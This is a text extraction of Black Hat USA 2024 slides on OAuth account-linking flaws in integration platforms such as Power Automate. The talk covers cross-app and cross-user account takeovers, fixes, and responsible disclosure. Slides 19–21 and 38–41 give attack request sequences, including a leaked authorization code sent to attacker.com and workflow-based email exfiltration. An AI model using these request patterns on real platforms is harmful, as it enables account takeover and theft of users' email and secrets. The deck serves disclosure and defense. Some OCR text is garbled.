---
title: "One Hack to Rule Them All Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT,"
speakers: ["Kaixuan Luo", "Xianbo Wang", "Adonis Fung", "Julien Lecomte", "Wing Cheong Lau"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Kaixuan Luo & Xianbo Wang & Adonis Fung & Julien Lecomte & Wing Cheong Lau_One Hack to Rule Them All Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT, _Compressed.pdf"
pages: 48
sha256: "8c64e2161e6586c1fd56a8938f1a10ea3f524bfe791de4b0425c0ad836a7706d"
text_chars: 15486
ocr_pages: 2
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:59:33Z"
---
# One Hack to Rule Them All Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT,

**Speakers:** Kaixuan Luo, Xianbo Wang, Adonis Fung, Julien Lecomte, Wing Cheong Lau  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Kaixuan Luo & Xianbo Wang & Adonis Fung & Julien Lecomte & Wing Cheong Lau_One Hack to Rule Them All Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT, _Compressed.pdf` (48 pages)


## Slide 1

**One Hack to Rule Them All:** Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT, & LLM Services

Kaixuan Luo<sup>1</sup> , Xianbo Wang<sup>1</sup> Adonis Fung<sup>2</sup> , Julien Lecomte<sup>2</sup> , Wing Cheong Lau<sup>1</sup>

1 The Chinese University of Hong Kong, 2 Samsung Research America

#BHUSA @BlackHatEvents

## Slide 2

###### **About us**

**Kaixuan Luo*** PhD Candidate

* Part of the work done while interning at Samsung

**Wing Cheong Lau** Professor

**Xianbo Wang** PhD Candidate @sanebow

**Adonis Fung** Director of Engineering, Security Samsung Research America

**Julien Lecomte** Head of So9ware Engineering & Opera>ons Samsung Research America

#BHUSA @BlackHatEvents

2

## Slide 3

###### **Agenda**

###### **1. Executive Summary**

**2. Protocol Analysis:** Challenges, Flaws, Attacks & Defenses **3. Impact Analysis** : Testing & securing 20+ integration platforms

**4. Case Study** : One concrete example of attack

**5. Key Takeaways**

#BHUSA @BlackHatEvents

3

## Slide 4

# **Executive Summary**

#BHUSA @BlackHatEvents

4

## Slide 5

###### **What is an Integration Platform?**

###### **Workflow Automation Platforms**

###### **Virtual Voice Assistants**

**Microsoft Power Automate**

###### **IoT Platforms/ Smart Homes**

###### **LLM Platforms with Plugins**

#BHUSA @BlackHatEvents

5

## Slide 6

###### **What is an Integration Platform?**

**Account Linking Platform App Account Account**

**Control app(s) on behalf of User**

Integration Platform
"Alexa,
Turn off my lights and
Get me a Lyft to SFO."

**Integrated Apps**

- **Integration Platform** <u>Connects</u> and Aggregates functionalities of diverse apps/services

- • **Account Linking** Links the end-user's App accounts to Integration platform account

• **OAuth** is the de facto standard protocol to achieve Account Linking 6

#BHUSA @BlackHatEvents

## Slide 7

##### **Open Marketplace Design**

Anyone can publish an app
Microsoft
Power Automate

#BHUSA @BlackHatEvents

7

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Open Marketplace Design
alex
a
S
<
©
6
Top Skills
SiriusXM
‘Alexa, play the Highway on SiriusKM”
Streaming Services
Song Quiz
‘Alexa, start Song Quiz”
Games
iHeartRadio
“Alexa, play z. one hundred”
Music Info, Reviews & Recognition Services
Spotify
“Alexa, Play Spotify”
Podcasts
Rain Sounds by Sleep Jar®
“Alexa, open Rain Sounds”
Relax to gentle rain sounds
Local radio stations
“Alexa, play K-Love radio”
Streaming Services
Smart Life
“Alexa, turn on hallway light”
Smart Home
Av ?
Home Devices More
Power Automate
Anyone can publish an app
P Search
All connectors
Microsoft
Power Auton
q
nate oz
team Office 365 Outl.
of — My flows
[S Approvals
A Solutions
Cg Process mining
2 Desktop flow activity RSS
48% — Connections
[2 Automation center (preview)
5% Custom connectors
é
@ Machines
@ == Connectors
Approvals
More
Power Platform
a
Dropbox
BS
Viva Engage
2] ‘Ask 3 chatbot
©)
Microsoft Data.
Y
i
Planner
‘SharePoint OneDrive for B. Microsoft Forms
zl
Power Bl
J
2
Azure DevOps
SQL Server
El
Notifications
OneNote (Busi,
<
Microsoft Teams
Office 365 Users
Outlook.com
31
Google Calendar
4
x Excel Online (B. Mail Microsoft To-D. Gmail MSN Weather Outlook Tasks
Trello Project Online Azure Applicati Project Roadmap File System FIP Google Drive
raowm|
aD o salesforce
ate
Slack GitHub YouTube Todoist OneDrive Azure Blob Stor. Salesforce
PREVIUM
#BHUSA @BlackHatEvents
```

## Slide 8

###### **When Account Linking goes Wrong**

###### **LGTM !**

User controls their own apps, services or devices

###### **Privacy Leakage**

#BHUSA @BlackHatEvents

8

## Slide 9

###### **When Account Linking goes Wrong**

###### **LGTM !**

Account Takeovers

**Privacy Leakage**

Forced Account Linking

**Attacker as a Malicious App**

**Victim's Benign App Account**

**Cross-app A)ack**

#BHUSA @BlackHatEvents

9

## Slide 10

###### **When Account Linking goes Wrong**

###### **LGTM !**

Account Takeovers

**Privacy Leakage**

**Attacker as a Platform User**

**Victim's Benign App Account**

**Cross-user A)ack**

#BHUSA @BlackHatEvents

10

## Slide 11

**Quick Demo**

#BHUSA @BlackHatEvents

11

## Slide 12

# **Protocol Analysis**

#BHUSA @BlackHatEvents

12

## Slide 13

###### **Recall: Traditional OAuth** OAuth 2.0 Authorization Code Grant

**OAuth Client User-agent Authoriza*on Server**

#BHUSA @BlackHatEvents

13

## Slide 14

###### **However**

**Traditional OAuth Protocol ≠** Customize **OAuth-based Account Linking**

**Unique Challenges:** Track <active app, active platform user> aka Maintain Account Linking Session

**Focus: Session Integrity Issues** of OAuth-based **Account Linking** in **Integration Platforms**

#BHUSA @BlackHatEvents

14

## Slide 15

Cross-app A*acks

#BHUSA @BlackHatEvents

15

## Slide 16

###### **Challenge #1: Supporting Multiple Integrated Apps/Services**

OAuth Client User-agent Authoriza*on Servers

16

#BHUSA @BlackHatEvents

## Slide 17

###### **Common (but failed) designs for Tracking Active App Info**

#BHUSA @BlackHatEvents

17

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Common (but failed) designs
for Tracking Active App Info
Start OAuth with Lyft
/authorize?state=<state>&redirect_uri= G@,
Embed
Active App Info
=3i
gence, state> Authorize
Extract |]. foken.with code=<code> =
Active App Info /token w); Exchange
N wi
and Select with code
17
Fr
f°
» | Exchange
Token
```

## Slide 18

**Common (but failed) designs for Tracking Active App Info**

state is opaque to Authoriza8on Servers

**Platform Must embed in (and extract from):**

• **state=eyJxxx.yyy.zzz** {"app_id": **<lyft>** , …}

**/ state-associated session**

#BHUSA @BlackHatEvents

18

## Slide 19

###### **Attack #1:** Cross-app OAuth Account Takeover (COAT)

Authorization Code Injection per Sec. 4.5 of OAuth 2.0 Security BCP

###### **Cross-app Attacks**

**① GET** https:// **malicious.com** /authorize ?client_id+redirect_uri= **<malicious_app>** &state= **<malicious_app>**

**②** Redirect to **benign app** , while keeping **malicious app** 's state

**③ GET** https:// **benign.com** /authorize ?client_id+redirect_uri= **<benign_app>** &state= **<malicious_app>**

**④ Flaw:** Track active app solely by state

#BHUSA @BlackHatEvents

19

## Slide 20

**Common (but failed) designs for Tracking Active App Info**

**Platform Must embed in (and extract from):** or • **redirect_uri:** https://platform.com/ **<lyft>** /redirect

redirect_uri has weak integrity

20

app_id

#BHUSA @BlackHatEvents

## Slide 21

###### **Attack #2:** Cross-app OAuth Request Forgery (CORF)

**Cross-app Attacks**

###### Attacker prepares code<sup>_Attacker_</sup>

a fresh authorization code at Benign App

**① GET** https:// **malicious.com** /authorize ?client_id= **<malicious_app>** &redirect_uri=platform.com/ **<malicio us_app>** /redirect&state=<state>

**②** Redirect to **benign app** 's , Injecting the prepared code

**③ GET** https://platform.com/ **<benign_app>** /redirect ?code=<attacker>&state=<state>

**④ Flaw:** Track active app solely by distinct redirect_uri

#BHUSA @BlackHatEvents

21

## Slide 22

###### **Proper Implementation for both COAT and CORF:** Consistency Check at Platform Backend

①Must embed a unique app ID in (and extract from) BOTH: ②Enforce Matching
at
• state=eyJxxx.yyy.zzz AND • redirect_uri:
{"app_id":  <lyft> , https://platform.com/ <lyft> /redirect
…}
/ state-associated session 22 app_id #BHUSA @BlackHatEvents

## Slide 23

###### **Proper Implementation for both COAT and CORF:** Consistency Check at Platform Backend

Mismatch …
Detected!
Enforce Matching
• state=eyJxxx.yyy.zzz at
• redirect_uri:
{"app_id":  <malicious> ,
https://platform.com/ <spotify> /redirect
…}
/ state-associated session 23 #BHUSA @BlackHatEvents
app_id

## Slide 24

Cross-user A*acks

#BHUSA @BlackHatEvents

24

## Slide 25

###### **Vanilla OAuth relies on Browser to Track Session**

Browser cookies link
OAuth authorization
to a user session

25

#BHUSA @BlackHatEvents

## Slide 26

###### **Challenge #1: User-Agent can't Track Session due to "Multiple" Origins**

**Scenario I:** involvement of **multiple origins** (domains) Due to server-side decoupling. e.g., microservices, shared auth component

#BHUSA @BlackHatEvents

26

## Slide 27

###### **Common Pattern: URL-Dispatched Account Linking Session**

Cross-user
A)ack

EPIC FAIL!
Session Fixation Attack

#BHUSA @BlackHatEvents

27

## Slide 28

###### **Challenge #2: User-Agent can't Track Session due to the "Gap" with Native App**

**Scenario II:** involvement of **multiple user-agents** Native app (e.g., Android app) can't pass cookies to the external browser

#BHUSA @BlackHatEvents

28

## Slide 29

###### **Common Pattern: Embed Linking Session in** **_state_ Parameter**

Cross-user
A)ack

EPIC FAIL!
(implicit) Session Fixation Attack
29

#BHUSA @BlackHatEvents

29

## Slide 30

###### **Proper Implementation: Return to Original UA**

Authen=cated space
Un-authenticated space
Session Passing No more
prone to session
session passing
fixation attacks
Best practice: return to the original User-Agent

#BHUSA @BlackHatEvents

30

## Slide 31

### **Impact Analysis: Make the World a Better Place**

#BHUSA @BlackHatEvents

31

## Slide 32

## **Make the World a Better Place Bug Hunting**

###### **7 Workflow Automation 7 Platforms**

N/A

**6 Virtual 6 Voice Assistants**

**4 Smart Homes4**

1- Click Attack

#BHUSA @BlackHatEvents

32

## Slide 33

Make the World a Better Place
Bug Hunting
2 LLM Plugins2
N/A due to
6 Misc.
6 Closed Marketplace
Summary Cross-app Attacks Cross-user Attacks
24/25  are vulnerable ,
16 /18 open platforms 16 /25 platforms
19  can be done in 1- Click
on an unassuming link
8  platforms vulnerable to both
33 #BHUSA @BlackHatEvents

## **Make the World a Better Place Bug Hunting**

#BHUSA @BlackHatEvents

33

## Slide 34

## **Make the World a Better Place**

###### **Responsible Disclosure:**

- Informed all 24 vulnerable platforms

- Confirmed by 16 platforms, patched or are applying fixes

- • 4 Critical/P1 bugs, 5 High/P2 bugs

- CVE-2023-36019, CVSS score: 9.6

- **$50,000+** bug bounties

###### **Kudos to the following responsible companies:**

- **Samsung:** Studied as early as 2019, later extended to a full-blown research

- **Microsoft:** Keep us closest in the loop

- **Amazon:** Responsible and Generous

- **Google:** Fixed in two weeks

#BHUSA @BlackHatEvents

34

## Slide 35

# **Concrete Attack Example**

#BHUSA @BlackHatEvents

35

## Slide 36

## **Microsoft Demo 1: Steal Outlook Emails Power Automate**

#BHUSA @BlackHatEvents

36

## Slide 37

##### **How to launch the attack?**

**External apps Internal apps**

**Microsoft Power Automate Integration Platform**

**Integrated Apps**

**Attacking first-parties (MS-owned Services)** Implicitly Trusted => No Consent Ever **Combining 2 attacks, making 1-click to our** **_unpublished_ malicious app** OAuth Session Fixation **+** COAT Vulnerability **=** 1-click Account Takeovers

**<u>Attacker</u>** starts w/ benign app

Victim starts w/ **<u>malicious app</u>**

**<u>Attacker</u>** starts w/ **<u>malicious app</u>**

#BHUSA @BlackHatEvents

37

## Slide 38

##### **Attack Preparations**

- **[ Initiate Account Linking ]** POST

https://api.powerapps.com/shared_test-5fe4103bc0fad2111d-5fd90941 b0420eacf9/connections/2eadad06-944a-4c33-81c7-35f4-008027c7

**[ /pre_authorize ]** GET

https://consent.azure-apim.net/login?data= **eyJMb2dpbklkIjoiYXNpYS0 wMDFfdGVzdC01ZmU0MTAzYmMwZmFkMjExMWQtNWZkOTA5ND F...BYXZNYXFZM3IrZTl0SzQ0YmZGQTU2R3VBQlVaYkxrOHM9In0**

**URL-dispatched Account linking session**

#BHUSA @BlackHatEvents

38

## Slide 39

##### **Distribute Attack URL**

**/pre_authorize URL**

**Redirects to** GET

https:// **attacker.com** /authorize ?client_id= **123456**

&redirect_uri= **https://global.consent.azure-apim.net/redirect** &state= **20df1848-3847-47dc-b98a-01befca5675d**

**Crafted Redirect in COAT**

**Redirects to**

GET

https:// **login.microsoftonline.com/common/oauth2/authorize** ?client_id= **7ab7862c-4c57-491e-8a45-d52a7e023983** &redirect_uri= **https://consent.azure-apim.net/redirect/office365** & **prompt=select_accountprompt=none** &state= **20df1848-3847-47dc-b98a-01befca5675d**

**Account Selection Page Bypass**

#BHUSA @BlackHatEvents

39

## Slide 40

##### **Leak Authorization Code**

###### **Return Authorization Code to**

GET https://consent.azure-apim.net/redirect/ **office365** ?code=0.AVQAZ0SPUnKTWkq... 5uEj04ZBukYUg &state= **20df1848-3847-47dc-b98a-01befca5675d** w/ cookie state20df1848-3847-47dc-b98a-01befca5675d= {"AppId": " **test-5fe4103bc0fad2111d-5fd90941b0420eacf9** "…} **Token Exchange** POST https:// **attacker.com** /token code=0.AVQAZ0SPUnKTWkq... 5uEj04ZBukYUg **User Session Integrity Check Mismatch detected, but too late!**

#BHUSA @BlackHatEvents

40

## Slide 41

##### **Configure Workflow to Exfiltrate Emails**

Microsoft
Power Automate

**Integration Platform Integrated Apps**

Forward all emails
to my server

#BHUSA @BlackHatEvents

41

## Slide 42

#### **Last Demo: What's worse than Secrets Leaked?**

#BHUSA @BlackHatEvents

42

## Slide 43

## **Attack Summary**

###### **Microsoft Power Automate**

**With just 1 click on an unassuming link**

- Steal Office 365 Outlook Emails

- Leak Azure Key Vault Secrets (1 more click to steal another app's access)

- • And more … (50+ Apps/Services in Microsoft 365 and Azure)

#BHUSA @BlackHatEvents

43

## Slide 44

##### **Related Work**

- **Traditional IdP Mix-up Attack (Theoretical Attacks with no real-world impact, Defense NOT applicable to integration platforms)**

- `o` https://danielfett.de/2020/05/04/mix-up-revisited/

   - **[CCS '16]** Daniel Fett, Ralf Küsters, and Guido Schmitz. A Comprehensive Formal Security Analysis of OAuth 2.0

   - **[RFC 9207]** Meyer zu Selhausen, K. and D. Fett. OAuth 2.0 Authorization Server Issuer Identification

- **Related isolated instances of attacks (Weaker attacks, Parallel Independent Work)** `o` https://fatnassifiras.medium.com/cross-tenant-information-disclosure-unravelingmicrosoft-connections-custom-connectors-and-oauth-6487321d28b3

- `o` https://hackerone.com/reports/1727221

#BHUSA @BlackHatEvents

44

## Slide 45

##### **Paradigm Shift due to "OAuth-Roles Reversal"**

⭐

**Cross-app Attacks**

**OAuth for "Account Linking" in Integration Platforms**

**IdP Mix-up Attack Traditional OAuth for Single Sign-on (SSO)**

**Authoriza*on Server (AS)**

**OAuth Client**

Practical Attacks

**Untrusted** Apps

**Authoriza*on Server (AS) a.k.a. Iden*ty Provider (IdP)**

**OAuth Client a.k.a. Relying Party (RP)**

Theoretical Attack only

**Trusted** IdPs

#BHUSA @BlackHatEvents

45

## Slide 46

##### **Summary: Taxonomy of our NEW Attacks**

**# Vulnerable Instances**

**Security Impact 11 COAT** Unauthorized (Cross-app OAuth **16** Access Account Takeover) **# Platforms Cross-app Attack 18** Open **5 CORF** Privacy Marketplace (Cross-app OAuth Leakage **25** Request Forgery) **Integration 16 Platforms Cross-user 16 OAuth** Unauthorized **Attack Session Fixation** Access **7** Closed Marketplace

**Defense** Consistency Check of App ID in state and redirect_uri Return to Original UA/Origin & Complete Linking

#BHUSA @BlackHatEvents

46

## Slide 47

## **Black Hat Sound Bytes**

- OAuth-based **Account Linking** in integration platforms has critical **design flaws**

- **1-Click Account Takeovers** still exploitable in-the-wild

- **One Hack to Rule Them All:**

   - **Pervasive impact across all well-known brands** , covering almost entire Internet

   - `o` **All Apps/Services** integrated with these vulnerable platforms are impacted

   - Until platform fixes, **all users** (including you) **can be victims**

- Urgent need for **industrial standards** to secure the entire ecosystem

47

#BHUSA @BlackHatEvents

## Slide 48

###### **Thank you**

**Kaixuan Luo*** PhD Candidate

* Part of the work done while interning at Samsung

**Wing Cheong Lau** Professor

**Xianbo Wang** PhD Candidate @sanebow

**Adonis Fung** Director of Engineering, Security Samsung Research America

**Julien Lecomte** Head of So9ware Engineering & Opera>ons Samsung Research America

#BHUSA @BlackHatEvents

48
